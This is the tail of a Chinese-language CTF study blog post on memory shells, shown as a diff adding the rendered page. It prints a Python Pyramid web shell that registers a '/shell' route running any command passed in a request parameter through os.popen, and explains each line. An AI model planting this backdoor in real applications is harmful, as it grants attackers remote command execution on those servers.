+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">from pyramid.response import Response
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">config = sys.modules[&#39;__main__&#39;].config
+</span></span><span class="line"><span class="cl">app=sys.modules[&#39;__main__&#39;].app;print(config)
+</span></span><span class="line"><span class="cl">config.add_route(&#39;shell&#39;, &#39;/shell&#39;)
+</span></span><span class="line"><span class="cl">config.add_view(lambda request: Response(__import__(&#39;os&#39;).popen(request.params.get(&#39;1&#39;)).read()),route_name=&#39;shell&#39;)
+</span></span><span class="line"><span class="cl">app = config.make_wsgi_app()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>主要是多了以下几条</p>
+<p><code>import sys</code>：这行代码导入了Python的标准库模块sys，用于访问与Python解释器紧密相关的变量和函数。</p>
+<p><code>from pyramid.response import Response</code></p>
+<p>上面两个是引用库</p>
+<p><code>config = sys.modules['__main__'].config</code>：这当前运行环境中存在名为config的对象，并且它是全局命名空间的一部分（即位于__main__模块中）。config对象通常用于存储应用程序配置信息，在Pyramid框架中，它还负责定义应用的行为，如路由规则等。
+<code>app=sys.modules['__main__'].app;print(config)</code>：类似地，app也被认为是在全局命名空间中存在的一个变量，代表了WSGI兼容的应用实例。<code>WSGI(Web Server Gateway Interface)</code>是一种用于Python web应用和服务之间通信的标准接口。</p>
+<p>这两个是定义config和app</p>
+<p><code>app = config.make_wsgi_app()</code>：最后，这行代码调用了config上的make_wsgi_app方法，创建了一个新的WSGI应用实例，并将其赋值给app变量。这一步骤完成了应用的构建过程。</p>
+<p>具体实例可以移步tgctf复现。</p>
+<h4 id="小结-3">小结：
+</h4><p>​	整体上差别不大，但是还是需要好好学习一下。</p>
+<h2 id="四后语">四、后语
+</h2><p>​	内存马就暂时结束了，最后大头的java内存马就放到以后再学习。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">渗透知识点汇总</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/awdawdp%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">AWD|AWDP从零到一</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E8%87%AA%E4%B8%BB%E7%A0%94%E7%A9%B6%E6%96%B0%E5%8F%91%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">自主研究新发现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/nodejs/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">NodeJS</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/sql%E6%B3%A8%E5%85%A5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 liernian
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
